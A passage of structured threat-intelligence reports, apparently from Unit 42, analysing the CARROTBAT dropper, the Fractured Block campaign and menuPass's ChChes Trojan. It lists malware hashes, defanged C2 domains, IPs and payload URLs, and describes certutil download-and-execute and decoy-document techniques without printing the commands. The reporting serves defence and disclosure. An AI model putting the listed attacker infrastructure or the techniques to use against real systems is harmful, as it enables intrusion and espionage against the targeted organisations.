                "ed63e84985e1af9c4764e6b6ca513ec1c16840fb2534b86f95e31801468be67a"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "9dfe3afccada40a05b8b34901cb6a63686d209e2b92630596646dba8ee619225"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "4c201f9949804e90f94fe91882cb8aad3e7daf496a7f4e792b9c7fed95ab0726"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "63c3817a5e9984aaf59e8a61ddd54793ffed11ac5becef438528447f6b2823af"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "c1a9b923fc1f81d69bd0494d296c75887e4a0f9abfc1cdfbfa9c0f4ab6c95db7"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "56924402a17393e542f6bf5b02cd030cc3af73bc2e1c894a133cebb2ca9405ee"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ceb8093507911939a17c6c7b39475f5d4db70a9ed3b85ef34ff5e6372b20a73e"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "52ba17b90244a46e0ef2a653452b26bcb94f0a03b999c343301fef4e3c1ec5d2"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "4958fe8c106200da988c22957821513efd05803460e8e5fcfedb5cbca8d87a5b"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "7d2b1af486610a45f78a573af9a9ad00414680ff8e958cfb5437a1b140acb60c"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "bdd90ed7e40c8324894efe9600f2b26fd18b22dcbf3c72548fee647a81d3c099"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "f3d3fa4c76adfabd239accb453512af33ae8667bf261758f402fff22d9df1f67"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "4b8790e9cb2f58293c28e695bec0a35e2ebd2da8e151c7e8c4513a1508c8bc94"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ad63b8677c95792106f5af0b99af04e623146c6206125c93cf1ec9fbfeafaac9"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "c3ac29e4b0c5e1a991d703769b94c0790fbf81fd38cf6acdb240c5246c2517ca"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "a761b47ab25dc2aa66b2f8ad4ab9636e40ebbcaf67f8a34f3524456c09f47d76"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "42e874d96cb9046cd4113d04c1c5463b1d43a4e828ca872de11c08cd314e650f"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Domain: handicap[.]eu5[.]org"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "IP Resolution: 69.197.143[.]12"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Domain: panda2019[.]eu5[.]org"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "IP Resolution: 162.253.155[.]226"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Domain: downplease[.]c1[.]biz"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "IP Resolution: 185.176.43[.]94"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Domain: lookplease[.]c1[.]biz"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "IP Resolution: 185.176.43[.]94"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "6fa895d0472e87dea3c5c5bd6774488d2d7fe409ff9ae83870be3740fdfd40e8"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Domain: downyes[.]c1[.]biz"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "IP Resolution: Unavailable/unknown"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "989c042ab9a07b11026bce78dc091f25fa51cb5e310c668904afc7939b197624"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Domain: downplease[.]c1[.]biz"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "IP Resolution: 185.176.43[.]94"
            ]
        }
    ],
    "372e834f5fb1373eae9ce3bfeead240eacf3041d": [
        {
            "type": "paragraph",
            "content": [
                "Unit 42 has uncovered a campaign leveraging a previously unreported customized dropper that is being used to deliver lures primarily pertaining to the South Korea and North Korea region.",
                "These lures revolve around a series of subjects, including various cryptocurrencies, cryptocurrency exchanges, and political events.",
                "Based on various information witnessed within this dropper, Unit 42 has dubbed this malware family CARROTBAT."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "CARROTBAT was initially discovered in an attack on December 2017.",
                "This attack was made against a British government agency using the SYSCON malware family.",
                "SYSCON is a simple remote access Trojan (RAT) that uses the file transfer protocol (FTP) for network communications.",
                "While there is no evidence that this attack against a British government agency made use of the CARROTBAT dropper, we found overlaps within this attacks infrastructure that ultimately lead us to CARROTBATs initial discovery, as well as other ties between these two malware families."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In total, 29 unique CARROTBAT samples have been identified to date, containing a total of 12 confirmed unique decoy documents.",
                "These samples began appearing in March of this year, with the majority of activity taking place within the past 3 months.",
                "The payloads vary, as earlier instances delivered SYSCON, while newer instances are delivering the previously reported OceanSalt malware family.",
                "CARROTBAT and their associated payloads constitute a campaign that we are dubbing Fractured Block."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Initial Attack"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "On December 13, 2017, a spear phishing email was sent from the email address of yuri.sidorav@yandex[.]ru to a high ranking individual within a British government agency.",
                "This email contained the following subject, with an attached document file of the same name:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Within this attached Word document, the following text is displayed:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "U.S. would talk with North Korea without precondition: Tillerson, By Seungmock",
                "Oh"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This text references an article that was published on the same day as the attack by NKNews[.]org.",
                "The article in question discusses diplomatic ties between the United States and North Korea."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 1 Article referenced by decoy document in attack against British government agency"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The attached document leverages a DDE exploit to ultimately execute the following code:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Palo Alto Networks first witnessed this DDE exploit technique in May 2017, and attackers continue to leverage it.",
                "The command run by this particular malware sample attempts to download a remote executable file named 0_31.doc, which in turn is placed within the victims %TEMP% directory with the filename of AAA.exe prior to being executed."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The payload in question belongs to the SYSCON malware family.",
                "It communicates with ftp.bytehost31[.]org via FTP for command and control (C2)."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 2 SYSCON network traffic witnessed during execution"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Pivoting on the domain hosting the SYSCON sample, 881.000webhostapp[.]com, revealed a number of additional samples, including a sample of the KONNI malware family, and four 64-bit executable files belonging to the CARROTBAT malware family.",
                "Pivoting further on characteristics belonging to CARROTBAT ultimately led to the identification of 29 unique samples in this malware family."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Fractured Block Campaign"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The campaign dubbed Fractured Block encompasses all CARROTBAT samples identified to date.",
                "CARROTBAT itself is a dropper that allows an attacker to drop and open an embedded decoy file, followed by the execution of a command that will download and run a payload on the targeted machine.",
                "In total, the following 11 decoy document file formats are supported by this malware:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "After the embedded decoy document is opened, an obfuscated command such as the following is executed on the system:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This command will attempt to download and execute a remote file via the Microsoft Windows built-in certutil utility.",
                "More information on this technique and the CARROTBAT malware family may be found within the Appendix."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The 29 unique CARROTBAT malware samples have compile timestamps between March 2018 to September 2018.",
                "Of these 29 unique samples, 11 unique decoy documents were leveraged in attacks, as seen in the figure below:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 3 Timeline of decoy documents being dropped by CARROTBAT"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "A majority of the decoy documents targeting victims in Korea had subject matter related to cryptocurrencies.",
                "In one unique case, the decoy contains a business card belonging to an individual working at COINVIL, which is an organization that announced plans to build a cryptocurrency exchange in the Philippines in May 2018."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Additional lure subjects included timely political events, such as relations between the U.S. and North Korea, as well as a trip by U.S. President Donald Trump to a summit in Singapore."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Payloads for the CARROTBAT samples varied.",
                "Originally, between the periods of March 2018 to July 2018, multiple instances of the SYSCON malware family were observed.",
                "These samples communicated with the following hosts via FTP for C2 communication:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Beginning in June 2018, we observed the OceanSalt malware family being dropped by CARROTBAT.",
                "These samples continue to be used at the time of this writing, and were observed communicating with the following host for C2 communication:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Interesting Ties with Other Threat Activity"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "As stated earlier within this blog, there is infrastructure overlap between the CARROTBAT and KONNI malware families.",
                "KONNI is a RAT that is believed to have been in use for over four years, with a wide array of functionalities, often leveraging free web hosting providers like 000webhost for its C2 infrastructure.",
                "This particular malware family has yet to be attributed to a named group at the time of this writing, however, targeting has historically focused on the Southeast Asia region."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Another relationship we have mentioned repeatedly is the use of the SYSCON malware family.",
                "This particular malware family was first reported in October 2017 and has been observed delivering decoy documents pertaining to North Korea.",
                "The malware is generally unsophisticated, making use of remote FTP servers for C2 communication."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Below you can see the KONNI usage highlighted in the gold flags and SYSCON highlighted in the purple flags."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 4 Maltego diagram correlating malicious activity"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Finally, the third overlap is the OceanSalt malware payload.",
                "First reported by McAfee in October 2018, reported victims include South Korea, the United States, and Canada.",
                "Like the samples outlined in the McAfee report, the OceanSalt samples observed in the Fractured Block Campaign employed the same code similarities as those of Comment Crew (aka APT1), however, we believe that these code similarities are a false flag.",
                "The malware used by Comment Crew has been in circulation for many years, and we do not believe the activity outlined in this blog post has any overlap with the older Comment Crew activity."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 5 Threat activity overlap over time"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Conclusion"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Finding CARROTBAT provided an important lynchpin in identifying Fractured Block Campaign activity.",
                "Using CARROTBAT, we were able to find related OceanSalt, SYSCON and KONNI activity.",
                "The various overlaps encountered are notable, and it is our suspicion that this threat activity may all belong to the same threat actor.",
                "However, we do not believe there to be enough evidence at this time to make this claim with complete certainty."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The CARROTBAT malware family is a somewhat unique dropper and while it supports various types of decoy documents, and employs rudimentary command obfuscation, it should be made clear that it is not sophisticated."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "While the actors behind Fractured Block remain active,"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Palo Alto Networks customers are protected from this threat in the following ways:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "A special thanks to Chronicle's VirusTotal team for their assistance researching this threat."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Appendix"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "CARROTBAT Technical Analysis"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "For the analysis below, the following sample is used:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Upon execution, the malware will read the last 8 bytes of itself.",
                "These bytes include two DWORDs that contain both the length of the embedded decoy document, as well as the type of file it is."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 6 End of CARROTBAT file containing decoy document information"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Using this gathered information, CARROTBAT continues to read the end of itself, minus the previously retrieved 8 bytes.",
                "This data contains the entirety of the embedded decoy document and is written to the same directory and filename as the original malware sample.",
                "However, the file extension is changed based on the previously retrieved file type value.",
                "The following corresponding values are used by CARROTBAT:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In this particular case, the .hwp file extension is used for the decoy document.",
                "After the decoy is dropped to disk, it is opened in a new process.",
                "In this instance, the whitepaper for the BKN Bank cryptocurrency exchange is displayed to the victim:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 7 HWP decoy document displayed to victim"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "After this document is displayed, the malware will continue to execute the following command in a new process:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This command will download a remote file using the built-in Microsoft Windows certutil command.",
                "In this particular instance, the following script is retrieved:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This script simply checks the operating system of the victim and downloads the respective payload again using the certutil executable.",
                "In this particular instance, the payload is encoded via base64, which certutil decodes.",
                "The payload in question is a CAB file that is then unpacked.",
                "Finally, the malware executes the extracted install.bat script before deleting the original files and exiting."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 8 CARROTBAT downloading final payload via certutil"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The downloaded CAB file has the following properties:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The following three files and their descriptions are dropped by this CAB file:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The C2 information is stored via the external winnet.ini file and is encoded using an incremental XOR key.",
                "The following function written in Python may be used to decode this file:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Once decoded it is discovered that this instance of OceanSalt attempts to communicate with 61.14.210[.]72 on port 7117."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "CARROTBAT Samples"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "d34aabf20ccd93df9d43838cea41a7e243009a3ef055966cb9dea75d84b2724d"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "8b6b4a0e0945c6daf3ebc8870e3bd37e54751f95162232d85dc0a0cc8bead9aa"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "26fc6fa6acc942d186a31dc62be0de5e07d6201bdff5d7b2f1a7521d1d909847"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "e218b19252f242a8f10990ddb749f34430d3d7697cbfb6808542f609d2cbf828"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "824f79a8ee7d8a23a0371fab83de44db6014f4d9bdea90b47620064e232fd3e3"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "70106ebdbf4411c32596dae3f1ff7bf192b81b0809f8ed1435122bc2a33a2e22"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "87c50166f2ac41bec7b0f3e3dba20c7264ae83b13e9a6489055912d4201cbdfc"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ac23017efc19804de64317cbc90efd63e814b5bb168c300cfec4cfdedf376f4f"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "d965627a12063172f12d5375c449c3eef505fde1ce4f5566e27ef2882002b5d0"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "7d443434c302431734caf1d034c054ad80493c4c703d5aaeafa4a931a496b2ae"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "1142dcc02b9ef34dca2f28c22613a0489a653eb0aeafe1370ca4c00200d479e0"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "337b8c2aac80a44f4e7f253a149c65312bc952661169066fe1d4c113348cc27b"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "92b45e9a3f26b2eef4a86f3dae029f5821cffec78c6c64334055d75dbf2a62ef"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "42e18ef3aaadac5b40a37ec0b3686c0c2976d65c978a2b685fefe50662876ded"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ba78f0a6ce53682942e97b5ad7ec76a2383468a8b6cd5771209812b6410f10cb"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "dca9bd1c2d068fc9c84a754e4dcf703629fbe2aa33a089cb50a7e33e073f5cea"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "7d8376057a937573c099e3afe2d8e4b8ec8cb17e46583a2cab1a4ac4b8be1c97"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "3cbccb059225669dcfdc7542ce28666e0b1a227714eaf4b16869808bffe90b96"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "aef92be267a05cbff83aec0f23d33dfe0c4cdc71f9a424f5a2e59ba62b7091de"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "2547b958f7725539e9bba2a1852a163100daa1927bb621b2837bb88007857a48"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "6c591dddd05a2462e252997dc9d1ba09a9d9049df564d00070c7da36e526a66a"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "22b16fa7af7b51880faceb33dd556242331daf7b7749cabd9d7c9735fb56aa10"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "3869c738fa80b1e127f97c0afdb6c2e1c15115f183480777977b8422561980dd"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ba100e7bac8672b9fd73f2d0b7f419378f81ffb56830f6e27079cb4a064ba39a"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "e527ade24beacb2ef940210ba9acb21073e2b0dadcd92f1b8f6acd72b523c828"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "9fa69bdc731015aa7bdd86cd311443e6f829fa27a9ba0adcd49fa773fb5e7fa9"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ffd1e66c2385dae0bb6dda186f004800eb6ceaed132aec2ea42b1ddcf12a5c4e"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "e3b45b2e5d3e37f8774ae22a21738ae345e44c07ff58f1ab7178a3a43590fddd"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "a0f53abde0d15497776e975842e7df350d155b8e63d872a914581314aaa9c1dc"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "SYSCON Payload Samples"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "5a2c53a20fd66467e87290f5845a5c7d6aa8d460426abd30d4a6adcffca06b8b"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "fceceb104bed6c8e85fff87b1bf06fde5b4a57fe7240b562a51727a37034f659"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "fa712f2bebf30592dd9bba4fc3befced4c727b85a036550fc3ac70d1965f8de5"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "da94a331424bc1074512f12d7d98dc5d8c5028821dfcbe83f67f49743ae70652"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "2efdd25a8a8f21c661aab2d4110cd7f89cf343ec6a8674ff20a37a1750708f27"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "62886d8b9289bd92c9b899515ff0c12966b96dd3e4b69a00264da50248254bb7"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "f27d640283372eb805df794ae700c25f789d77165bb98b7174ee03a617a566d4"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "0bb099849ed7076177aa8678de65393ef0d66e026ad5ab6805c1c47222f26358"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "f4c00cc0d7872fb756e2dc902f1a22d14885bf283c8e183a81b2927b363f5084"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "e8381f037a8f70d8fc3ee11a7bec98d6406a289e1372c8ce21cf00e55487dafc"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "1c8351ff968f16ee904031f6fba8628af5ca0db01b9d775137076ead54155968"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "2da750b50ac396a41e99752d791d106b686be10c27c6933f0d3afe762d6d0c48"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "5d1388c23c94489d2a166a429b8802d726298be7eb0c95585f2759cebad040cf"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "0490e7d24defc2f0a4239e76197f1cba50e7ce4e092080d2f7db13ea0f88120b"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "OceanSalt Payload Samples"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "59b023b30d8a76c5984fe62d2e751875b8b3ebe2d520891458cb66a4e9c40005"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "7cf37067f08b0b8f9c58a35d409fdd6481337bdc2d5f2152f8e8f304f8a472b6"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "fe8d65287dd40ca0a1fadddc4268268b4a77cdb04a490c1a73aa15b6e4f1dd63"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "a23f95b4a602bdaef1b58e97843e2f38218554eb57397210a1aaa68508843bd0"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "59b023b30d8a76c5984fe62d2e751875b8b3ebe2d520891458cb66a4e9c40005"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "cfe436c1f0ce5eb7ac61b32cd073cc4e4b21d5016ceef77575bef2c2783c2d62"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "7ae933ed7fc664df4865840f39bfeaf9daeb3b88dcd921a90366635d59bc15f2"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "3663e7b197efe91fb7879a56c29fb8ed196815e0145436ee2fad5825c29de897"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "59b023b30d8a76c5984fe62d2e751875b8b3ebe2d520891458cb66a4e9c40005"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "7ae933ed7fc664df4865840f39bfeaf9daeb3b88dcd921a90366635d59bc15f2"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "cf31dac47680ff1375ddaa3720892ed3a7a70d1872ee46e6366e6f93123f58d2"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "fe186d04ca6afec2578386b971b5ecb189d8381be055790a9e6f78b3f23c9958"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Infrastructure"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "https://881.000webhostapp[.]com/1.txt"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "http://attach10132.1apps[.]com/1.txt"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "https://071790.000webhostapp[.]com/1.txt"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "https://vnik.000webhostapp[.]com/1.txt"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "https://7077.000webhostapp[.]com/vic/1.txt"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "http://a7788.1apps[.]com/att/1.txt"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "http://s8877.1apps[.]com/vip/1.txt"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "http://hanbosston.000webhostapp[.]com/1.txt"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "http://bluemountain.1apps[.]com/1.txt"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "https://www.webmail-koryogroup[.]com/keep/1.txt"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "http://filer1.1apps[.]com/1.txt"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ftp.byethost7[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ftp.byethost10[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "files.000webhost[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "webhost[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "61.14.210[.]72:7117"
            ]
        }
    ],
    "bf9666919e2761a0c63016f77c51f4797439bf23": [
        {
            "type": "paragraph",
            "content": [
                "In 2016, from September through November, an APT campaign known as menuPass targeted Japanese academics working in several areas of science, along with Japanese pharmaceutical and a US-based subsidiary of a Japanese manufacturing organizations.",
                "In addition to using PlugX and Poison Ivy (PIVY), both known to be used by the group, they also used a new Trojan called ChChes by the Japan Computer Emergency Response Team Coordination Center (JPCERT).",
                "In contrast to PlugX and PIVY, which are used by multiple campaigns, ChChes appears to be unique to this group.",
                "An analysis of the malware family can be found later in this blog."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Interestingly, the ChChes samples we observed were digitally signed using a certificate originally used by HackingTeam and later part of the data leaked when they were themselves hacked.",
                "Wapack labs also observed a similar sample targeting Japan in November.",
                "Its not clear why the attackers chose to use this certificate, as it was old, had been leaked online, and had already been revoked by the time they used it.",
                "Digital certificates are typically used because they afford an air of legitimacy, which this one definitely does not."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The attackers spoofed several sender email addresses to send spear phishing emails, most notably public addresses associated with the Sasakawa Peace Foundation and The White House.",
                "All the spear phishes were socially engineered with subjects appropriate for the target and the apparent sender.",
                "One of the more interesting subject lines was used in the White House attack; [UNCLASSIFIED]",
                "The impact of Trumps victory to Japan, sent two days after the election.",
                "Most of the attacks against academics involved webmail addresses using names of academics but are not tied to those academics openly online.",
                "However, all the spear phish recipients used email addresses tied to them online."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 1.",
                "Recent menuPass activity and some ties to older infrastructure"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The C2 infrastructure in these attacks is largely actor registered, with only a few Dynamic Domain Name System (DDNS) domains.",
                "menuPass typically makes use of a mix of DDNS and actor-registered domains in their attack campaigns.",
                "All of the related hashes and C2s are in appendix at the end of this blog."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "There is not much public information about the APT campaign called menuPass (also known as Stone Panda and APT10).",
                "A paper from FireEye in 2013 on several campaigns using PIVY included menuPass as one of them.",
                "A later blog added some additional details.",
                "The group name is derived from one of the passwords they use with PIVY in their attacks.",
                "Believed to have started activity in 2009 and to originate from China, the group initially was known for targeting US and overseas defense contractors but broadened their targeting as time passed.",
                "They have targeted Japanese organizations since at least 2014."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The newer ChChes malware family uses an import hash (bb269704ba8647da97377440d403ae4d) shared with other tools used by menuPass, affording an initial link.",
                "However, the ties are most strongly proved through infrastructure analysis, which shows a number of links between the newer infrastructure used in these attacks and older infrastructure publicly associated with the group.",
                "The three circled domains represent C2s publicly reported as tied to menuPass, linked to domains not previously publicly reported as associated.",
                "These are only a few of multiple overlaps analysts can find while researching menuPass infrastructure.",
                "The circled known domains are the first three below:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 2. menuPass infrastructure overlaps"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Two of these domains can further be tied into the newer C2 infrastructure.",
                "Again, these are only a few of the overlaps that can be uncovered by analyzing the infrastructure used by menuPass.",
                "The domains in the below figure are:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 3. Ties between new and older infrastructure."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Additionally, the passwords in the PIVY samples also fit known passwords used by the group  three samples use menuPass and the other uses keaidestone.",
                "With these data points, we assess with high confidence the recent attacks were conducted by the menuPass group."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Following is our analysis of the ChChes malware family."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "For this analysis, Unit 42 looked at the following file:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This malware is provided with an icon that appears to be that of a Microsoft Word document, as we can see in the image below."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 4. Icon used for ChChes"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Additionally, we discovered that the samples identified in attacks against Japanese organizations were digitally signed using the certificate originally used by the Italian-based company, HackingTeam.",
                "Readers may recall that HackingTeam was compromised and subsequently had a large amount of internal data exposed in July 2015.",
                "This data included a wealth of code used by the organization, including certificates.",
                "The certificate in question was fairly old, and expired on August 4th, 2012.",
                "On July 10th, 2015, the certificate was revoked."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 5.",
                "Digital signing of ChChes"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 6.",
                "Certificate revocation"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Multiple instances of malware have been discovered using this certificate since it was originally leaked in 2015.",
                "It is unclear why the actors decided to use this certificate that is tied to known malicious samples for their own samples.",
                "One possibility may be to make attribution more difficult for analysts researching these threats."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "When the malware is initially run, it will first decrypt an embedded stub of code within the malware prior to executing it.",
                "This stub has many characteristics seen in shellcode, and begins by creating a new Import Address Table (IAT).",
                "This new IAT is then referenced throughout the remainder of the code when calling Windows APIs.",
                "The following snippet of assembly shows the newly created IAT being referenced to call various functions, such as GetProcessHeap, RtlAllocateHeap, RtlReAllocateHeap, and InternetReadFile."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 7.",
                "Newly created IAT being used to call Windows API functions"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "After the IAT has been generated, the malware will determine the path of %TEMP% and set its current working directory to this value.",
                "ChChes",
                "proceeds to collect the following information about the victim:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This information is aggregated into a string such as the following:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "WBQTLJRH9553618*2564?3618468394?C:\\\\Users\\\\ADMINI~1\\\\AppData\\\\Local\\\\Temp?1.4.1 (1024x768)*6.1.7601.17514"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Note that in the string above, the 3618468394 and 1.4.1 strings are hardcoded within the malware itself.",
                "These may indicate versions of the malware or campaign identifiers, however, this has not been confirmed."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "After this data has been aggregated, it is uploaded to a hardcoded command and control (C2) server via HTTP.",
                "The data is embedded within the Cookie HTTP header, as seen below"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 8.",
                "Initial HTTP beacon for ChChes"
            ]
        },
        {
            "type": "paragraph",
            "content": [
